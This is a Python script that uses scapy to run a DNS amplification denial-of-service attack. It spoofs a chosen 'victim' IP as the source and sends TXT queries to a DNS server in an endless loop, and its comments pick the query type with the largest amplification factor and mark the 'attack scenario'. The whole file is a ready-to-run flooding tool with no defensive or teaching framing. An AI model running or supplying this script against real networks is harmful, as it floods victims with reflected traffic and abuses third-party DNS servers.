#! /usr/bin/env python3
# run as sudo
from scapy.all import *
import sys, time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-I", "--Interface", dest="Interface",
                        help="Network Interface", required=True)
    parser.add_argument("-v", "--victim-ip", dest="victim",
                        help="victim IP address", required=True)
    parser.add_argument("-d", "--dns-ip", dest="dns",
                        help="dns server ip address", required=True)
    opt = parser.parse_args()
    return opt


def main():
    # interface = "wlp0s20f3"                    # Interface you want to use
    # victim = "192.168.66.45"               # IP of that interface
    # dnsTarget = ["ip1","ip2","ip3"] # List of DNS Server IPs
    opt = get_arguments()
    dnsTarget = opt.dns
    victim = opt.victim
    interface = opt.Interface
    time_to_live = 128

    query_name = "www.example.com"  ## add to argparser ?
    query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"]
    query_type = query_type[9] ##max factor type is TXT
    packet = IP(src=victim, dst=dnsTarget, ttl=time_to_live) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type))
    # query = sr1(packet, iface=interface, timeout=10) #will wait until one response
    # print('amplification_factor %f' % (len(query)/len(packet)))
    # use send() when attack scenario
    while True:
        try:
            query = send(packet, iface=interface) #will wait until one response
        except TypeError:
            print('time out')
            sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)

if __name__ == "__main__":
    main()
